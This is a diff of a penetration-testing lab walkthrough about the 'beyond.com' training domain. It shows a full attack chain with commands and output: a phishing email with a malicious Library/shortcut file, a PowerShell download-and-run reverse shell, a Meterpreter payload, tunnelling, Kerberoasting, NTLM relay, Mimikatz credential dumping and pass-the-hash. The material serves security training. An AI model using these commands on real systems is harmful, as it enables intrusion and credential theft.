-- The output shows another excellent `crackmapexec` feature, it identified the domain name as `beyond.com` and added it to the usernames!
- - This indicates MAILSRV1 may be domain-joined and we have a valid set of domain creds.
-
-As we have obtained valid creds, we need to plan our next steps.  Reviewing the CrackMapExec and Nmap output of MAILSRV1, our options are limited.  We have a mail server and SMB, but no WinRM or RDP, also note that `john` is not a local admin on MAILSRV1 as the result is missing `Pwn3d!`.
-
-We have two options.
-- Further enum SMB on MAILSRV1, looking for sensitive info on accessible shares.
-- Prepare a maliscious email attachment and send a phishing email as `john` to `daniela` or `marcus`
-
-*We should be aware that CrackMapExec outputs STATUS_LOGON_FAILURE when a password for an existing user is not correct, but also when a user does not exist at all. Therefore, we cannot be sure at this point that the domain user accounts daniela and marcus even exist.*
-
-We will pursue option one first and use CrackMapExec to list the SMB shares with their perms on MAILSRV1 with `--shares` and the creds for `john`.  We may identify info that we can use for the second option.
+SMB         192.168.247.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<ul>
+<li>We identify one valid set of creds from the staging script we on WEBSRV1.</li>
+<li>The output shows another excellent <code>crackmapexec</code> feature, it identified the domain name as <code>beyond.com</code> and added it to the usernames!</li>
+<li>This indicates MAILSRV1 may be domain-joined and we have a valid set of domain creds.</li>
+</ul>
+<p>As we have obtained valid creds, we need to plan our next steps.  Reviewing the CrackMapExec and Nmap output of MAILSRV1, our options are limited.  We have a mail server and SMB, but no WinRM or RDP, also note that <code>john</code> is not a local admin on MAILSRV1 as the result is missing <code>Pwn3d!</code>.</p>
+<p>We have two options.</p>
+<ul>
+<li>Further enum SMB on MAILSRV1, looking for sensitive info on accessible shares.</li>
+<li>Prepare a maliscious email attachment and send a phishing email as <code>john</code> to <code>daniela</code> or <code>marcus</code></li>
+</ul>
+<p><em>We should be aware that CrackMapExec outputs STATUS_LOGON_FAILURE when a password for an existing user is not correct, but also when a user does not exist at all. Therefore, we cannot be sure at this point that the domain user accounts daniela and marcus even exist.</em></p>
+<p>We will pursue option one first and use CrackMapExec to list the SMB shares with their perms on MAILSRV1 with <code>--shares</code> and the creds for <code>john</code>.  We may identify info that we can use for the second option.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ crackmapexec smb 192.168.247.242 -u john -p &quot;dqsTwTpZPn#nL&quot; --shares
 SMB         192.168.247.242 445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
 SMB         192.168.247.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
@@ -940,22 +990,18 @@ SMB         192.168.247.242 445    MAILSRV1         Share           Permissions 
 SMB         192.168.247.242 445    MAILSRV1         -----           -----------     ------
 SMB         192.168.247.242 445    MAILSRV1         ADMIN$                          Remote Admin
 SMB         192.168.247.242 445    MAILSRV1         C$                              Default share
-SMB         192.168.247.242 445    MAILSRV1         IPC$            READ            Remote IPC</p>
-<pre><code>- We identify the default shares with no actionable permissions.
-
-Our only remaining option is to prepare a phishing email with a maliscious attachment and send it to our two target users.
-
-##### Phishing for Access
-
-In this section we will perform a client side attack by sending a phishing email.  We&#39;ve discussed two client side attack techniques, MS Office Docs with Macros and Win Library files in combination with shortcut files.
-
-We lack informatino about the internal machines and infra, so we will utilize the second technique as we do not know if MS Office is installed on the target systems.
-
-For this attack we have to set up a WebDAV share, a Python3 web server, a Netcat listener, and prepare the Windows Library/shortcut files.
-
-Let&#39;s setup with WebDAV share on our Kali machine port 80 with `wsgidav`, using `/home/$USER/beyond/webdav` as root.
+SMB         192.168.247.242 445    MAILSRV1         IPC$            READ            Remote IPC
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<ul>
+<li>We identify the default shares with no actionable permissions.</li>
+</ul>
+<p>Our only remaining option is to prepare a phishing email with a maliscious attachment and send it to our two target users.</p>
+<h5>Phishing for Access</h5>
+<p>In this section we will perform a client side attack by sending a phishing email.  We&#39;ve discussed two client side attack techniques, MS Office Docs with Macros and Win Library files in combination with shortcut files.</p>
+<p>We lack informatino about the internal machines and infra, so we will utilize the second technique as we do not know if MS Office is installed on the target systems.</p>
+<p>For this attack we have to set up a WebDAV share, a Python3 web server, a Netcat listener, and prepare the Windows Library/shortcut files.</p>
+<p>Let&#39;s setup with WebDAV share on our Kali machine port 80 with <code>wsgidav</code>, using <code>/home/$USER/beyond/webdav</code> as root.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/OffSec/beyond/webdav
 Running without configuration file.
 15:34:39.226 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
@@ -970,35 +1016,36 @@ Running without configuration file.
 15:34:39.228 - WARNING : Share &#39;/&#39; will allow anonymous write access.
 15:34:39.228 - WARNING : Share &#39;/:dir_browser&#39; will allow anonymous read access.
 15:34:39.251 - INFO    : Running WsgiDAV/4.2.0 Cheroot/10.0.0 Python 3.11.6
-15:34:39.251 - INFO    : Serving on <a href="http://0.0.0.0:80">http://0.0.0.0:80</a> ...</p>
-<pre><code>- Our WebDAV share is now served on port 80 with anon access settings.
-
-Now we can connect to WINPREP via RDP as user `offsec` and password `lab` to prepare the Windows Library and shortcut files, open VS Code once connected and create a new text file on the desktop named `config.Library-ms`.
-
-We can copy in the boilerplate code we used in the Client-Side Attacks Module and edit the IP to point to our Kali machine.
+15:34:39.251 - INFO    : Serving on http://0.0.0.0:80 ...
 </code></pre>
-<?xml version="1.0" encoding="UTF-8"?>
-<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
-<name>@windows.storage.dll,-34582</name>
-<version>6</version>
-<isLibraryPinned>true</isLibraryPinned>
-<iconReference>imageres.dll,-1003</iconReference>
-<templateInfo>
-<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
-</templateInfo>
-<searchConnectorDescriptionList>
-<searchConnectorDescription>
-<isDefaultSaveLocation>true</isDefaultSaveLocation>
-<isSupported>false</isSupported>
-<simpleLocation>
-<url>http://192.168.119.5</url>
-</simpleLocation>
-</searchConnectorDescription>
-</searchConnectorDescriptionList>
-</libraryDescription>
-```
-- Save the file and transfer it to `/home/kali/beyond`
-
+<ul>
+<li>Our WebDAV share is now served on port 80 with anon access settings.</li>
+</ul>
+<p>Now we can connect to WINPREP via RDP as user <code>offsec</code> and password <code>lab</code> to prepare the Windows Library and shortcut files, open VS Code once connected and create a new text file on the desktop named <code>config.Library-ms</code>.</p>
+<p>We can copy in the boilerplate code we used in the Client-Side Attacks Module and edit the IP to point to our Kali machine.</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://192.168.119.5&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</code></pre>
+<ul>
+<li>Save the file and transfer it to <code>/home/kali/beyond</code></li>
+</ul>
 <p>Next we create our shortcut on WINPREP, right-click on the desktop and select <code>New &gt; Shortcut</code>.  We map the shortcut to download PowerCat and create a reverse shell with the following command.</p>
 <pre><code>powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.163:8000/powercat.ps1&#39;); powercat -c 192.168.45.163 -p 4444 -e powershell&quot;
 </code></pre>
@@ -1006,7 +1053,7 @@ We can copy in the boilerplate code we used in the Client-Side Attacks Module an
 <li>Save the shortcut as <code>install</code> and transfer to Kali into the WebDAV root dir.</li>
 </ul>
 <p>Next we serve PowerCat via Python3 web server by copying <code>powercat.ps1</code> to our working dir and serve it on port 8000 as specified in our PS command.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 http/
 
 ┌──(operator㉿labhost)-[~/OffSec/beyond/http]
@@ -1014,7 +1061,7 @@ We can copy in the boilerplate code we used in the Client-Side Attacks Module an
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 </code></pre>
 <p>We can now start our Netcat listener to catch the incoming reverse shell.</p>
-<pre><code>┌──(operator㉿labhost)-[~]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 4444
 listening on [any] 4444 ...
 </code></pre>
@@ -1046,7 +1093,7 @@ John
 <li><code>--server 192.168.133.242</code></li>
 <li><code>-ap</code> to enable password auth.</li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.247.242 --body @body.txt --header &quot;Subject: Staging Script&quot; --suppress-data -ap
 Username: john
 Password: dqsTwTpZPn#nL
@@ -1080,7 +1127,7 @@ Password: dqsTwTpZPn#nL
 <li>After a few moments we recieve requests for our WebDAV and Python3 we servers.</li>
 <li>Our Netcat listener catches the shell.</li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [192.168.45.163] from (UNKNOWN) [192.168.247.242] 64122
@@ -1092,7 +1139,7 @@ Install the latest PowerShell for new features and improvements! https://aka.ms/
 PS C:\Windows\System32\WindowsPowerShell\v1.0&gt;
 </code></pre>
 <p>Display our current user, hostname, and IP address to confirm we have a foothold in the internal network.</p>
-<pre><code>PS C:\Windows\System32\WindowsPowerShell\v1.0&gt; whoami
+<pre><code class="language-powershell">PS C:\Windows\System32\WindowsPowerShell\v1.0&gt; whoami
 whoami
 beyond\marcus
 PS C:\Windows\System32\WindowsPowerShell\v1.0&gt; hostname
@@ -1128,7 +1175,7 @@ Ethernet adapter Ethernet0:
 <p>We will now attempt to gain situational awareness on the CLIENTWK1 sys and internal network.  We will first perform local enum of CLIENTWK1 to get an overview of the system and identify valuable info/data.  Then we enum the domain to discover users, computers, domain admins, lateral movement vectors, and PrivEsc.</p>
 <p><em>For this Learning Unit, we&#39;ll not explicitly store every result in our workspace directory on Kali. However, to get used to the documenting process you should create notes of all findings and information while following along.</em></p>
 <p>Copy the x64 winPEAS exec to the dir of our Python3 web server.  On target sys move to the home of user and download winPEAS.</p>
-<pre><code>PS C:\Windows\System32\WindowsPowerShell\v1.0&gt; iwr -uri http://192.168.45.163:8000/winPEASx64.exe -Outfile \Users\marcus\winPEASx64.exe
+<pre><code class="language-powershell">PS C:\Windows\System32\WindowsPowerShell\v1.0&gt; iwr -uri http://192.168.45.163:8000/winPEASx64.exe -Outfile \Users\marcus\winPEASx64.exe
 iwr -uri http://192.168.45.163:8000/winPEASx64.exe -Outfile \Users\marcus\winPEASx64.exe
 PS C:\Windows\System32\WindowsPowerShell\v1.0&gt; cd \Users\marcus\
 cd \Users\marcus\
@@ -1165,7 +1212,7 @@ PS C:\Users\marcus&gt; .\winPEASx64.exe
 <li>WinPEAS correctly detected the OS as Win 11 Pro.</li>
 <li>Always validate with <code>systeminfo</code> as winPEAS can incorrectly identify.</li>
 </ul>
-<pre><code>PS C:\Users\marcus&gt; systeminfo
+<pre><code class="language-powershell">PS C:\Users\marcus&gt; systeminfo
 systeminfo
 
 Host Name:                 CLIENTWK1
@@ -1221,7 +1268,7 @@ OS Version:                10.0.22000 N/A Build 22000
 </li>
 </ul>
 <p>As we did for creds, let&#39;s start a text file named <code>computer.txt</code> in our working dir to document the internal machines we ID and info about them.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ cat computer.txt
 172.16.133.240 - DCSRV1.BEYOND.COM -&gt; Domain Controller
 172.16.133.254 - MAILSRV1.BEYOND.COM -&gt; Mail Server -&gt; Dual Homed Host (External IP: 192.168.247.242)
@@ -1232,7 +1279,7 @@ OS Version:                10.0.22000 N/A Build 22000
 <p>As we haven&#39;t identified a PrivEsc vector via winPEAS and find nothing else actionable, a password manager for instance, we start enumerating the AD env and its objects.</p>
 <p>We learned several techniques for this type of enumeration.  For this module we will use <code>BloodHound</code> with the <code>SharpHound.ps1</code> collector as we discussed in Active Directory and Enumeration.</p>
 <p>Copy the PowerShell collector to serve via Python, download to our target, and import it to our PS session.</p>
-<pre><code>PS C:\Users\marcus&gt; iwr -uri http://192.168.45.163:8000/SharpHound.ps1 -Outfile SharpHound.ps1
+<pre><code class="language-powershell">PS C:\Users\marcus&gt; iwr -uri http://192.168.45.163:8000/SharpHound.ps1 -Outfile SharpHound.ps1
 iwr -uri http://192.168.45.163:8000/SharpHound.ps1 -Outfile SharpHound.ps1
 PS C:\Users\marcus&gt; ls
 ls
@@ -1271,7 +1318,7 @@ PS C:\Users\marcus&gt; . .\SharpHound.ps1
 . .\SharpHound.ps1
 </code></pre>
 <p>Execute <code>Invoke-BloodHound</code> with <code>-CollectionMethod All</code> to invoke all available methods.</p>
-<pre><code>PS C:\Users\marcus&gt; Invoke-BloodHound -CollectionMethod All
+<pre><code class="language-powershell">PS C:\Users\marcus&gt; Invoke-BloodHound -CollectionMethod All
 Invoke-BloodHound -CollectionMethod All
 2023-12-29T18:33:34.1195455-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
 2023-12-29T18:33:34.2445650-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
@@ -1364,7 +1411,7 @@ MAILSRV1.BEYOND.COM - Windows Server 2022 Standard
 CLIENTWK1.BEYOND.COM - Windows 11 Pro
 </code></pre>
 <p>In addition to the known systems, we discovered INTERNALSRV1.  We can obtain the IP with <code>nslookup</code>.</p>
-<pre><code>C:\Users\marcus&gt;nslookup INTERNALSRV1.BEYOND.COM
+<pre><code class="language-powershell">C:\Users\marcus&gt;nslookup INTERNALSRV1.BEYOND.COM
 nslookup INTERNALSRV1.BEYOND.COM
 DNS request timed out.
     timeout was 2 seconds.
@@ -1450,7 +1497,7 @@ Although they returned no results, the pre-built queries are a quick and powerfu
 <p>Keep in mind, finding an actionable vector does not stop the enum process.  We should finish collecting info, prioritize it, and then execute on potential attack vectors.</p>
 <p>As such, we will setup a SOCKS5 proxy to perform network enum via Nmap/CrackMapExec to identify accessible services, ports, and SMB settings!</p>
 <p>First we create a stage Meterpreter TCP reverse shell executable with <code>msfvenom</code>, we will save it to our working dir since we can reuse it through the domain.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe -o met.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -1460,7 +1507,7 @@ Final size of exe file: 7168 bytes
 Saved as: met.exe
 </code></pre>
 <p>Next start <code>multi/handler</code> with the corresponding settings in <code>msfconsole</code>, also set <code>ExitOnSession</code> to <code>false</code> which keeps the listener active for new sessions without the need to restart for incoming sessions.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ msfconsole -q
 msf6 &gt; use multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
@@ -1479,7 +1526,7 @@ msf6 exploit(multi/handler) &gt;
 [*] Started reverse TCP handler on 192.168.45.163:443
 </code></pre>
 <p>Download <code>met.exe</code> on CLIENTWK1.</p>
-<pre><code>PS C:\Users\marcus&gt; iwr -uri http://192.168.45.163:8000/met.exe -Outfile met.exe
+<pre><code class="language-powershell">PS C:\Users\marcus&gt; iwr -uri http://192.168.45.163:8000/met.exe -Outfile met.exe
 iwr -uri http://192.168.45.163:8000/met.exe -Outfile met.exe
 PS C:\Users\marcus&gt; .\met.exe
 .\met.exe
@@ -1513,7 +1560,7 @@ msf6 auxiliary(server/socks_proxy) &gt;
 <pre><code>socks5          127.0.0.1 1080
 </code></pre>
 <p>We are ready to enum via Proxychains and will start with the CrackMapExec SMB module to retrieve basic info of the identified server&#39;s SMB settings.  We will provide the creds for <code>john</code> to list the SMB shares and their perms with <code>--shares</code>.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo proxychains -q crackmapexec smb 172.16.87.240-241 172.16.87.254 -u john -d beyond.com -p &quot;dqsTwTpZPn#nL&quot; --shares
 SMB         172.16.87.240   445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
 SMB         172.16.87.254   445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
@@ -1544,7 +1591,7 @@ SMB         172.16.87.241   445    INTERNALSRV1     IPC$            READ        
 <li>With this security mechanism disabled we may be able to perform relay attacks if we can force auth requests.</li>
 </ul>
 <p>Next, using Nmap, we scan for commonly used ports on MAILSRV1, DCSRV1, and INTERNALSRV1 specifying the <code>-sT</code> option for TCP connect scan (required for Nmap to work over Proxychains).</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo proxychains -q nmap -sT -oN internal-servers.nmap -Pn -p 21,80,443 172.16.87.240 172.16.87.241 172.16.87.254
 [sudo] password for operator:
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-30 13:34 PST
@@ -1592,7 +1639,7 @@ meterpreter &gt; upload http/chisel.exe C:\\Users\\marcus\\chisel.exe
 [*] Uploaded 8.59 MiB of 8.59 MiB (100.0%): /home/operator/OffSec/beyond/http/chisel.exe -&gt; C:\Users\marcus\chisel.exe
 [*] Completed  : /home/operator/OffSec/beyond/http/chisel.exe -&gt; C:\Users\marcus\chisel.exe
 </code></pre>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ gunzip chisel_1.9.0_linux_amd64.gz
 
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
@@ -1627,7 +1674,7 @@ chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
 <li>Bind INTERNALSRV1 port 80 to Kali port 80.</li>
 <li><em>NOTE: kill wsgidav server first</em>.</li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ ./chisel server --port 8080 --reverse
 2023/12/30 14:03:01 server: Reverse tunnelling enabled
 2023/12/30 14:03:01 server: Fingerprint D8xrjq850tcudK3gJ2HmABSmOEjGVwsL1TpTmahCJWo=
@@ -1648,7 +1695,7 @@ chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
 <li>Indicating a DNS name set within the domain.</li>
 </ul>
 <p>To use the web app we add <code>internalsrv1.beyond.com</code> to <code>/etc/hosts</code></p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ tail /etc/hosts
 127.0.1.1       labhost
 
@@ -1677,7 +1724,7 @@ ff02::2 ip6-allrouters
 <p>We know that <code>daniela</code> is kerberoastable so we can attempt to retrieve their password.  If we crack the TGS-REP password hash, we can try the creds against INTERNALSRV1.</p>
 <p>If this attack vector fails, we can use WPScan and other web app enum tools to identify potential vulns on INTERNALSRV1 or switch targets to MAILSRV1.</p>
 <p>We can Kerberoasting from Kali with <code>impacket-GetUserSPNs</code> over our SOCKS5 proxy.  To obtain the TGS-REP hash of <code>daniela</code> we need to provide the creds of a domain user, so we will use <code>john</code>.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.87.240 beyond.com/john
 Impacket v0.11.0 - Copyright 2023 Fortra
 
@@ -1692,7 +1739,7 @@ http/internalsrv1.beyond.com  daniela            2022-09-29 01:17:20.062328  202
 $krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$c1939af6eee8a400b1ec41e96289cbf2$14d33d1eaa975da1b090c3de10c70319f6fc59c3ab31a35e956601901575a2d697baaef3d21hashcat47bfd4dae43aab19ed82300ed47ccf9925cd246711ebedbc9635fa876b85131b4b3fa11386393a59f4a8c58c69cfbe947959953fafb08a73032b382cc911daa1860e411099e12c42d49568e0410115bf6d841a7b0b8876dd4449ee94e87f48112504b419c3f6ba64edba7cc2c2e16147a8996524ea98f4a56cd7c19a017cf5f212c9292a8d12ca314e996e13da71800715b6a922379d50deceac9ca0c101f2282c3168e9b10adadccfa63740de5c2d819aba279919272163d4041246d7eaf4cfed29379b3b3e557b12a0427819280fa71a4c2e02eb8c4435be17554b2ff6014919ca6da594fed553be047470379133ab689886a3hashcat1b8d9090ef1a8c221e2a99b912a6b331ab86bb9f398655f2880a096fb40fd7f498bea77acda21b83bb762c3ebd2ee40acf25e9a3aa8d770e0997f1635cd0e3c02dbe6b1956defcb0dca884248190a5e67c077c2d8c042c94fcc9c5122ccf9996693ddaec616828d83bf2dcc8f923f368fe542f04c4dfd03d8bbf31c96e65d971ea6f991a2def70bd04e2313225bcc3aa5380c40525d055ed28f817208d0bfc690916ef509f0bc147045132e7bb08f963e624ee48b0cf5c0160dddb9c496e23ac8b5a3f10c65a91f1225ada552d40af5503966e49e9f15993b8ac98b6d8a3c532c9b8909ea7f8338930f312cf295b0012bd92da3ee44404234f53123f25070b9531d1fbdf50bf04724748b07326b999117b6f7c93dd89b474ee63cbcf40fd2843739e49e16d25df66d6c6daf727479378667178c89de6d11be01e5a0d91dfa4b44ae77d8764be7e44058f24a85d3ab9046ce87933e2d3a7aba23e3c6a850e5390f10f3a343a5bdff3754be06719d5a8e83218b6330513db0f9d3d38c04b9007290c9bf00d8b80be650fa407205734978b0cbe11dadd3dce07c258f63db8f7154c181b449d6c10312e6c83d34ff46ecc500bbb2c298232963abb2f889e4423a702486d91d5b1edabc4603029f69d9afea5572c83edf911a044e867bc098368d49be3164346d3906197e46c761b511038e10ede277eb90d6be09569c7c45c344f011e1142d3b4b5ee05678f487e4c01295cfe7b1bc9022ca0af9ecee463d75370d190156e9915b286e3f811ac8b27ef6ac69c166fb02947c5303e760e840849d7259980eabc8d33df0d27b4555ca57bfb8b1dca91bf957a1d8c9b8facac0a23ef05355f54d27f35255e551ac8aa76e37b9be40aa1b4df5ccb5d5b71e12025b844782c36a44dd71d3a174373c9a776e4f0cfdcbf36445edd105291212101cd71de93b8d56882727
 </code></pre>
 <p>Store the hash to <code>daniela.hash</code> an crack with Hashcat.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
 [sudo] password for operator:
 hashcat (v6.2.6) starting
@@ -1867,7 +1914,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Servers started, waiting for connections
 </code></pre>
 <p>Next we need a Netcat listener to catch the reverse shell.</p>
-<pre><code>┌──(operator㉿labhost)-[~]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 9999
 listening on [any] 9999 ...
 </code></pre>
@@ -1891,7 +1938,7 @@ listening on [any] 9999 ...
 <li>Auth to MAILSRV1 succeeds, indicating the same password is used on both local admin accounts.</li>
 </ul>
 <p>The realyed command was executed on MAILSRV1, our Netcat listener caught a shell!</p>
-<pre><code>┌──(operator㉿labhost)-[~]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 9999
 listening on [any] 9999 ...
 connect to [192.168.45.163] from (UNKNOWN) [192.168.201.242] 53368
@@ -1916,7 +1963,7 @@ PS C:\Windows\system32&gt;
 <p><em>Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for beccy.</em></p>
 <p>Once we determine that no AV is running we should upgrade our shell to Meterpreter, providing a more robust shell env and aid in post-exploitation.</p>
 <p>Let&#39;s download the previously created Meterpreter reverse shell payload <code>met.exe</code> to perform post-exploitation.</p>
-<pre><code>PS C:\Windows\system32&gt; iwr -uri http://192.168.45.163:8000/met.exe -Outfile met.exe
+<pre><code class="language-powershell">PS C:\Windows\system32&gt; iwr -uri http://192.168.45.163:8000/met.exe -Outfile met.exe
 PS C:\Windows\system32&gt; .\met.exe
 </code></pre>
 <p>Metasploit receives the incomming connection, spawn a new PowerShell command line.</p>
@@ -1940,7 +1987,7 @@ Install the latest PowerShell for new features and improvements! https://aka.ms/
 PS C:\Windows\system32&gt;
 </code></pre>
 <p>Download Mimikatz to MAILSRV1.</p>
-<pre><code>PS C:\Windows\system32&gt; iwr -uri http://192.168.45.163:8000/mimikatz.exe -Outfile mimikatz.exe
+<pre><code class="language-powershell">PS C:\Windows\system32&gt; iwr -uri http://192.168.45.163:8000/mimikatz.exe -Outfile mimikatz.exe
 iwr -uri http://192.168.45.163:8000/mimikatz.exe -Outfile mimikatz.exe
 PS C:\Windows\system32&gt; .\mimikatz.exe
 .\mimikatz.exe
@@ -1955,7 +2002,7 @@ PS C:\Windows\system32&gt; .\mimikatz.exe
 mimikatz #
 </code></pre>
 <p>Obtain SeDebugPrivilege and list all provider creds available on system.</p>
-<pre><code>mimikatz # privilege::debug
+<pre><code class="language-bash">mimikatz # privilege::debug
 Privilege &#39;20&#39; OK
 
 mimikatz # sekurlsa::logonpasswords
@@ -1994,7 +2041,7 @@ SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
 <h5>Lateral Movement</h5>
 <p>Now we will leverage domain admin privs of <code>beccy</code> to get access to the DC and achieve the second goal of the pentest.</p>
 <p>As we obtained a cleartext password and NTLM hash for <code>beccy</code> we can use <code>impacket-psexec</code> to get an interactive shell on DCSRV1.  While either would work, let&#39;s use the NTLM hash.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ proxychains -q impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.81.240
 Impacket v0.11.0 - Copyright 2023 Fortra
 
